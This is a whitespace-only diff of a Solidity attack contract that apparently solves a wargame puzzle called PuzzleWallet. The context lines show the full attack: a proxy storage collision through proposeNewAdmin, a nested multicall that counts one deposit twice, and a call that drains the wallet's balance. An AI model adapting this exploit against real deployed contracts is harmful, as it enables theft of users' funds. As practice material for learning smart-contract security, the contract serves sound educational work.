@@ -20,7 +20,7 @@ contract AttackPuzzleWallet {
     function attack() external payable {
         // change the proxy's slot 0 storage to this contract address
         victimProxy.proposeNewAdmin(address(this));
-        // whitelist this contract address 
+        // whitelist this contract address
         victimLogic.addToWhitelist(address(this));
 
         // use nested multicall to bypass `depositedCalled` flag
@@ -31,7 +31,7 @@ contract AttackPuzzleWallet {
         data[0] = depositSelector[0];
         data[1] = abi.encodeWithSelector(victimLogic.multicall.selector, depositSelector);
         victimLogic.multicall{value: msg.value}(data);
-        
+
         uint256 amount = victimLogic.balances(address(this));
         // drain the wallet balance
         victimLogic.execute(owner, amount, "");
